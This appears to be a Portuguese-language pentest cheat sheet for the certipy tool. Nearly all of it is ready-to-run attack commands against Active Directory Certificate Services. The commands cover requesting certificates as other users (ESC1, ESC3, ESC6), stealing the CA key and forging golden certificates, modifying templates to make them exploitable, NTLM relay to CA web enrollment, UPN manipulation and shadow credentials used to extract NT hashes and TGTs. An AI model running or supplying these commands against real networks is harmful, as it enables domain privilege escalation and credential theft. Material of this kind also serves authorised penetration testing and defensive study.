# certipy

% adcs, certificate, pki, windows, Active directory, template, shadow credential

## certipy - lista modelos de certificados
#plateform/linux #target/remote #cat/RECON
```
certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> 
```

## certipy - solicita certificados
#plateform/linux #target/remote #cat/ATTACK
```
certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority>
```

## certipy - autentica utilizando certificado pfx
#plateform/linux #target/remote #cat/CONNECT
```
certipy auth -pfx <pfx-file> 
```
## certipy - autentica pelo LDAP (canal) utilizando certificado pfx
#plateform/linux #target/remote #cat/CONNECT
```
certipy auth -pfx <pfx-file> -dc-ip <dc-ip> -ldap-shell
```

## certipy - Golden Certificate - rouba o certificado CA e a chave privada
#plateform/linux #target/remote #cat/ATTACK
```
certipy ca -u <user>@<domain> -p '<password>' -backup -ca <certificate-authority> -target-ip <ca-ip>
```

## certipy - Golden Certificate - forja um certificado
#plateform/linux #target/remote #cat/ATTACK
```
certipy forge -ca-pfx <pfx-file> -upn <user>@<domain> -crl ldap://<dc-ip>:389
```

## certipy - solicita um certificado para outro usuario - ESC1 - ESC6
#plateform/linux #target/remote #cat/ATTACK
```
certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority> -upn <targeted-user>@<domain>
```

## certipy - solicita um certificado em nome do agente certificador com uma solicitação de certificado - ESC3
#plateform/linux #target/remote #cat/ATTACK
```
certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority> -on-behalf-of '<NetBIOS-domain-name>\<targeted-user>' -pfx <pfx-file>
```

## certipy - modifica o modelo para torna-lo vulneravel a ESC1 - ESC4 
#plateform/linux #target/remote #cat/ATTACK
```
certipy template -u <user>@<domain> -p '<password>' -template <template> -save-old
```

## certipy - Emitir um certificado para um id de request especifico - ESC7
#plateform/linux #target/remote #cat/ATTACK
```
certipy ca -u <user>@<domain> -p '<password>' -ca <certificate-authority> -issue-request <csr-id>
```

## certipy - retransmitir a autenticação para a inscrição WEB do CA - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certipy relay -ca <ca-fqdn>
```

## certipy - retransmitir a autenticação do controlador de dominio para a inscrição WEB do CA - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certipy relay -ca <ca-fqdn> -template 'DomainController'
```

## certipy - Modifica o upn do usuario para outro - ESC9 - ESC10
#plateform/linux #target/remote #cat/ATTACK
```
certipy account update -u <user>@<domain> -p '<password>' -user <targeted-user> -upn <administrator-user>
```

## certipy - Adquirir NT hash - Shadow Credential
#plateform/linux #target/remote #cat/ATTACK
A cadeia inteirodo exploit Shadow Credential: Cria uma chave de credencial, autentica e consegue a NT hash e um TGT, depois remove a chave de credencial
```
certipy shadow auto -u <user>@<domain> -p '<password>' -account <targeted-user>
```